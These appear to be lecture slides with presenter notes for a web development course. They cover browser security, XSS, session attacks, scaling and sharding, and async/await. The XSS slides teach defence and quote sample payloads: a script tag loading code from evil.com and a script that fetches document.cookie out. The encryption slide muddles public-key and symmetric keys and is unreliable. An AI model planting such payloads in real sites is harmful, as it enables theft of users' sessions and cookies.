name: Browser Problems

* content can come from different sources
  * iframes, tabs, ads
* ads:
  * content from elsewhere
  * can inject code into page
  * `document.parent.frames[0].forms[0];`

???
* Cross-Site Request Forgery (CSRF)

* non https in cafe




---
name: Encryption

* public-key encryption:
  * each party (user/server) has two encryption keys, one public, one secret.
  * needs secret handshake to exchange public keys via known symmetric key
  * symmetric key: certificate signed by trusted authority
  * browser trusts multiple root certificate authorities
  * a domain having a certificate: https

---
name: Session Attacks

* stealing session id / token

* add https and session timeouts


???
* with jwt would need unlimited access to computer really if using https





---
name: Bad Input

* input validation
* executing user input
* trusting client

???
* purchase price example
* code execution on server example
* attacks on server, what about user to user






---
name: XSS

* Cross Site Scripting Attack
  * malicious user inputs content into site
  * display user input: `<script src="http://www.evil.com/p0wn.js">`
* protections:
  * vet input && output
  * react and express do a lot of this for us
  * dangerouslySetHTML...

???
* users vulnerable to other users input
* was ok because markdown parsed out stuff too




---
name: stored vs reflected

* stored:
  * malicious code stored in db from user input
* reflected:
  * fake version of page gets user to submit input to real version
  * input is reflected back:
    * username is incorrect
    * where username is `<script>fetch(..., document.cookie)</script>`


???
* again vetting input and output
* react automatically sanitizes everything (encodes all special characters etc)

* show user generated content
* extended validation https certificates
  * expensive and hard to get
* two factor auth

---
name: Scalability

* scale up
* scale out


???
* up is bigger machines
* out is more machines
* cpu, memory, network

name: Scale Out

---
name: Scale Out Challenges

* load balancing across many instances:
  * data access
  * concurrency
  * state

???
* websockets have trouble scaling out but everybody wants to use them
* stateless is better, cache session data
* auth token needs validation - cache user information




---
name: Scale Out Storage

* single database not enough
* sharding
  * hash keys across shards

???
* draw shards
* caches don't speed up writes
* row locking
* shard clusters with write master




---
name: Scale Out Storage

* fb initially one db per school
* fb in 2009:
  * 1,800 mysql servers
  * 2000 memcached servers
  * 10k servers total is estimate)

name:  The future!

* language and framework improvements
* es7 (not much there)
* es8?!

???
* in the stanford webdev class currently being taught react is "the future"




---
name: The future: async and await

```javascript
export default async function getLikes () {
  const users = await getUsers();
  const filtered = await filterUsersWithFriends(users);
  return getUsersLikes(filtered);
}
```

* syntax on top of promises
* await casts to promise
* returns promises
* errors -> reject
* return -> resolve
* available now in babel `stage-3`

???
* is like wrapping a promise in a generator
* returning intermediate values
* https://zeit.co/blog/async-and-await#the-future:-async-and-await
* http://bevacqua.github.io/promisees/






---
name:  The future: Observables

* asynch methods that can be subscribed to
  * function which returns an observable stream of events
  * can map / filter over streams of events
  * producer -> consumer
  * es8?
